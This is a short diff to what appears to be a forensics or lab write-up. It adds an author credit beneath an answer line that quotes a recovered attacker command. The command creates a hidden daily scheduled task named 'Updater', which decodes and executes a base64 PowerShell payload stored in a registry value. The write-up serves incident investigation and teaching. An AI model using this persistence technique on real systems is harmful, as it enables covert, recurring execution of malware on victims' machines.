@@ -189,3 +189,5 @@ Searching using keywords that are related to scheduled task.Command → strings 
 <img width="960" height="364" alt="Screenshot 2026-01-13 134914" src="https://github.com/user-attachments/assets/bf8f45e2-5b10-4b95-8fda-46e3ed49d2dc" />
 
 Answer: schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"’
+
+### Done By Ruthran-sec
